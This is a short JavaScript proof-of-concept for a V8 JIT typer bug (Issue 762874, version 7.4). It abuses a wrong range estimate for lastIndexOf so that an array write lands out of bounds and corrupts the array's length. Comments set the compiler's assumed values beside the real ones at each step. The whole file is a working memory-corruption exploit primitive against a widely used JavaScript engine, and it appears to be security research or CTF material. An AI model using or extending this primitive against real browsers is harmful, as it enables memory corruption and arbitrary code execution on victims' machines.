/*************************************************************
 * File Name: newOOBWrite.js
 * 
 * Created on: 2020-03-09 04:44:37
 * Author: raycp
 * 
 * Last Modified: 2020-03-09 06:11:49
 * Description: oob write primitive for Issue 762874, on version 7.4
************************************************************/

const maxLength = 1073741799 //%StringMaxLength();
const s = 'A'.repeat(maxLength);

function foo() {

    let idx  = s.lastIndexOf("", maxLength);
    // compiler: Range(-1.0, String::kMaxLength - 1.0)
    // reality: String::kMaxLength
    idx += 25;
    // compiler: Range(24, 0x3fffffff)
    // reality: 0x40000000
    idx = idx >>30;
    // compiler: Range(0, 0)
    // reality: 1
    idx = idx * 7;
    // compiler: Range(0, 0)
    // reality: 7

    let arr = [1.1, 2.2, , 4.4];
    arr[idx] = 1.74512933848984e-310;
    return arr;
}

foo();
%OptimizeFunctionOnNextCall(foo);
let oobArray = foo();
print(oobArray.length);
